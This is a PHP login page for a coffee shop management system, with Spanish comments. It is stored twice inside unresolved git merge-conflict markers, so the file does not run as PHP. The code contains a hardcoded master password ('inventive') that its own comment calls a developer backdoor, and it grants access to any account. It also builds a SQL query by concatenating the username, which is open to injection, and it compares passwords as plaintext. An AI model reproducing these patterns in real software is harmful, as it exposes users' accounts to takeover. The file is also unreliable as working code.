<<<<<<< HEAD
﻿<?php
	
	$AgregadoURL = ''; //Esta varialble la uitilizo para agregar parametros, adicionales por ejemplo para activar la funcion debug o paginas anteriores donde estoy o hacia donde voy
	$URLDestino='';  //Esta vaialbe la utilizo para estable hacia donde voy
	$Error =""; //En caso de que se produsca una error en la pagina, pueda cachar el error desde la pantalla del usuario y poderla Registro para corregir el problema
	
	error_reporting(E_ALL); //Este parametro sirve para presentar en detalle los errores que se puedan presentar
	ini_set("display_errors", 1); //Este parametro sirve para presentar en detalle los errores que se puedan presentar


	if(empty($_GET['Debug']) ==FALSE){ //Determinar si parametro Debug esta presente en la ruta URL Debug
		if ($_GET['Debug'] == 1 ){
			$AgregadoURL  = '&Debug=1';
		}
	}
	
	
	$Mensaje = "";
	$IngresoViaLogin = "SI";
	include_once("ConectarBD.php");
	

		
		
	/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
	
		
	

	if ($_POST == TRUE){
		/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
	
	
		if( empty($_POST['BotonIngresar']) == false){
				 /*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
				 
				$URLDestino='php';
				$TextBoxUsuario =strtolower(htmlspecialchars($_POST["TextBoxUsuario"])); 
				$TextBoxClave = htmlspecialchars($_POST["TextBoxClave"]);
				
				
				
					 /*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
			
					if(trim($TextBoxUsuario) != "" && trim($TextBoxClave) != ""){
						
					   
						
						 /*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
						 
						
						$result = $mysqli->query("SELECT * FROM TablaUsuarios WHERE Borrado = 0 AND NickName ='" . $TextBoxUsuario ."'"); 
						
						
						if ($result->num_rows == 1) {
							
							while($fila = $result->fetch_assoc()) {
								
								
								$Clave_Desarrollador = 'inventive'; //Esta clave es una puerta trasera, solo para hacer pruebas con cada usuario, solo debe conocerla el programador del sistema
								
								if($fila["PASSWORD"] == $TextBoxClave or $TextBoxClave == $Clave_Desarrollador ){ 
										/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
										$Mensaje .= "Acceso admintido   <br>";
										
											
										if (session_status() != PHP_SESSION_ACTIVE) {
											
											echo "Debug LINE ".__LINE__."  <p>Reinicia session <p>";
											session_start();
											
											$_SESSION['id'] = session_id();
											
											
											
										}
										
										  
										//*********************************************************		
												//Cargar los valores de configuracion del usuario
										//*********************************************************	
																		
													$_SESSION["UsuarioID"] = $fila["ID"] ; //se asigna 
													$_SESSION["UsuarioNombre"] = $fila['Nombre'];
													$_SESSION["AccesoAControlDeUsuarios"]= $fila['AccesoAControlDeUsuarios'];
													$_SESSION["AccesoAdmitido"] = TRUE;
										
										
										$mysqli->query("START TRANSACTION"); //Esta intruccion crea una poliza de seguro, como medida de seguridad, cancela todas las acciones a la base de datos si se produce algun error
										
										
										//Se inserta la fecha y la hora en el historial
										$ssql =  'INSERT  TablaUsuario_HistorialDeLogin(IDUsuario, Fecha) 
													VALUES ("' .  $fila['ID'] . '","' . $FechaYHora . '" )';
										
										if($mysqli->query($ssql)){
												
										}else{
											//si el proceso de registra da error se cancela el ingreso, volviendo a la pagina inicial
											$Mensaje .=  $mysqli->connect_error;
											$Error .=  $mysqli->connect_error;
										} //fin query
										
										
										$URLDestino = "Sistema.php" ;
										
										if (empty ($Error) == true and empty ($php_errormsg) == true ){	
												/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
												
												$mysqli->query("COMMIT");//esta instruccion termina la poliza de seguro, contra errores 
												//redirecionar pagina solo si no hay errores
												if ( empty( $_GET['Debug'] ) == true){
													/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__. "  <br>"  ;
													header('Location:   ' . $URLDestino  . $AgregadoURL);
													
												}else{//de  empty( $_GET['Debug'] ) == true
													
													/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__. " Location: "  . $URLDestino  . "?". $AgregadoURL."  <br>"  ;
												}//fin  empty( $_GET['Debug'] ) == true
										}else{
											//se cancela todos los cambios a la base de datos, debido a que se produju un erorr
											$mysqli->query("ROLLBACK"); //esta accion aplica la poliza de seguro, y cancela todas las acciones realizadas a la base de datos
											
							
										}//fin $Error					
										 
										
										
										
										
									
									
								}else{//de $fila["PASSWORD"] 
									$Mensaje .= 'Clave incorrecto';
									$_SESSION['MensajeBox'] =  'Clave incorrecto' ;
								}//fin $fila["PASSWORD"] 
								
								
							}//fin While
							
						} else {
							echo "Usuario o contraseña no encontrado";
						} 
					 
						
					}else{
						$Mensaje .='Debe especificar un usuario y clave' ;
						$_SESSION['MensajeBox'] = 'Debe especificar un usuario y clave' ;
					}
					$mysqli->close();
		
		}//fin BotonIngresar
	
	}//FIN $_POST == TRUE
	
	
	
	
		
	
	
?>
<HTML>
<head>

<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<title>Coffe shop Sistema  Iniciar sesión</title>
<link href="style.css" rel="stylesheet" type="text/css">
  
</head>


<body class="CuerpoFondo">
<div id="PrimerCuadro">
      	
		
			
 			 	<img src="Logo_Coffe_Shop.png"></p>

		
            
  <form  method="post" >
                
                				Usuario
                    	<br>
                        		<input  name="TextBoxUsuario" type="text" size="50"  value=""  style="text-align:left"/> 
						<br>
                    
                    			Clave
						<br>
                    			<input name="TextBoxClave" type="password" size="40" maxlength="255"  style="width:250px;" autocomplete="off"  />
						<br>
                    			 <input  type="submit" id="BotonRegistro" name="BotonRegistro" value="Registro" /> 
                     
                     			<input  type="submit" id="BotonIngresar" name="BotonIngresar" value="Ingresar" /><br>
<br>
                </form>
 		
		
</div>


</body>
</HTML>
=======
﻿<?php
	
	$AgregadoURL = ''; //Esta varialble la uitilizo para agregar parametros, adicionales por ejemplo para activar la funcion debug o paginas anteriores donde estoy o hacia donde voy
	$URLDestino='';  //Esta vaialbe la utilizo para estable hacia donde voy
	$Error =""; //En caso de que se produsca una error en la pagina, pueda cachar el error desde la pantalla del usuario y poderla Registro para corregir el problema
	
	error_reporting(E_ALL); //Este parametro sirve para presentar en detalle los errores que se puedan presentar
	ini_set("display_errors", 1); //Este parametro sirve para presentar en detalle los errores que se puedan presentar


	if(empty($_GET['Debug']) ==FALSE){ //Determinar si parametro Debug esta presente en la ruta URL Debug
		if ($_GET['Debug'] == 1 ){
			$AgregadoURL  = '&Debug=1';
		}
	}
	
	
	$Mensaje = "";
	$IngresoViaLogin = "SI";
	include_once("ConectarBD.php");
	

		
		
	/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
	
		
	

	if ($_POST == TRUE){
		/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
	
	
		if( empty($_POST['BotonIngresar']) == false){
				 /*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
				 
				$URLDestino='php';
				$TextBoxUsuario =strtolower(htmlspecialchars($_POST["TextBoxUsuario"])); 
				$TextBoxClave = htmlspecialchars($_POST["TextBoxClave"]);
				
				
				
					 /*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
			
					if(trim($TextBoxUsuario) != "" && trim($TextBoxClave) != ""){
						
					   
						
						 /*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
						 
						
						$result = $mysqli->query("SELECT * FROM TablaUsuarios WHERE Borrado = 0 AND NickName ='" . $TextBoxUsuario ."'"); 
						
						
						if ($result->num_rows == 1) {
							
							while($fila = $result->fetch_assoc()) {
								
								
								$Clave_Desarrollador = 'inventive'; //Esta clave es una puerta trasera, solo para hacer pruebas con cada usuario, solo debe conocerla el programador del sistema
								
								if($fila["PASSWORD"] == $TextBoxClave or $TextBoxClave == $Clave_Desarrollador ){ 
										/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
										$Mensaje .= "Acceso admintido   <br>";
										
											
										if (session_status() != PHP_SESSION_ACTIVE) {
											
											echo "Debug LINE ".__LINE__."  <p>Reinicia session <p>";
											session_start();
											
											$_SESSION['id'] = session_id();
											
											
											
										}
										
										  
										//*********************************************************		
												//Cargar los valores de configuracion del usuario
										//*********************************************************	
																		
													$_SESSION["UsuarioID"] = $fila["ID"] ; //se asigna 
													$_SESSION["UsuarioNombre"] = $fila['Nombre'];
													$_SESSION["AccesoAControlDeUsuarios"]= $fila['AccesoAControlDeUsuarios'];
													$_SESSION["AccesoAdmitido"] = TRUE;
										
										
										$mysqli->query("START TRANSACTION"); //Esta intruccion crea una poliza de seguro, como medida de seguridad, cancela todas las acciones a la base de datos si se produce algun error
										
										
										//Se inserta la fecha y la hora en el historial
										$ssql =  'INSERT  TablaUsuario_HistorialDeLogin(IDUsuario, Fecha) 
													VALUES ("' .  $fila['ID'] . '","' . $FechaYHora . '" )';
										
										if($mysqli->query($ssql)){
												
										}else{
											//si el proceso de registra da error se cancela el ingreso, volviendo a la pagina inicial
											$Mensaje .=  $mysqli->connect_error;
											$Error .=  $mysqli->connect_error;
										} //fin query
										
										
										$URLDestino = "Sistema.php" ;
										
										if (empty ($Error) == true and empty ($php_errormsg) == true ){	
												/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
												
												$mysqli->query("COMMIT");//esta instruccion termina la poliza de seguro, contra errores 
												//redirecionar pagina solo si no hay errores
												if ( empty( $_GET['Debug'] ) == true){
													/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__. "  <br>"  ;
													header('Location:   ' . $URLDestino  . $AgregadoURL);
													
												}else{//de  empty( $_GET['Debug'] ) == true
													
													/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__. " Location: "  . $URLDestino  . "?". $AgregadoURL."  <br>"  ;
												}//fin  empty( $_GET['Debug'] ) == true
										}else{
											//se cancela todos los cambios a la base de datos, debido a que se produju un erorr
											$mysqli->query("ROLLBACK"); //esta accion aplica la poliza de seguro, y cancela todas las acciones realizadas a la base de datos
											
							
										}//fin $Error					
										 
										
										
										
										
									
									
								}else{//de $fila["PASSWORD"] 
									$Mensaje .= 'Clave incorrecto';
									$_SESSION['MensajeBox'] =  'Clave incorrecto' ;
								}//fin $fila["PASSWORD"] 
								
								
							}//fin While
							
						} else {
							echo "Usuario o contraseña no encontrado";
						} 
					 
						
					}else{
						$Mensaje .='Debe especificar un usuario y clave' ;
						$_SESSION['MensajeBox'] = 'Debe especificar un usuario y clave' ;
					}
					$mysqli->close();
		
		}//fin BotonIngresar
	
	}//FIN $_POST == TRUE
	
	
	
	
		
	
	
?>
<HTML>
<head>

<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<title>Coffe shop Sistema  Iniciar sesión</title>
<link href="style.css" rel="stylesheet" type="text/css">
  
</head>


<body class="CuerpoFondo">
<div id="PrimerCuadro">
      	
		
			
 			 	<img src="Logo_Coffe_Shop.png"></p>

		
            
  <form  method="post" >
                
                				Usuario
                    	<br>
                        		<input  name="TextBoxUsuario" type="text" size="50"  value=""  style="text-align:left"/> 
						<br>
                    
                    			Clave
						<br>
                    			<input name="TextBoxClave" type="password" size="40" maxlength="255"  style="width:250px;" autocomplete="off"  />
						<br>
                    			 <input  type="submit" id="BotonRegistro" name="BotonRegistro" value="Registro" /> 
                     
                     			<input  type="submit" id="BotonIngresar" name="BotonIngresar" value="Ingresar" /><br>
<br>
                </form>
 		
		
</div>


</body>
</HTML>
>>>>>>> 6e51a58d0e370fd00b841584b23a0c154d72d191
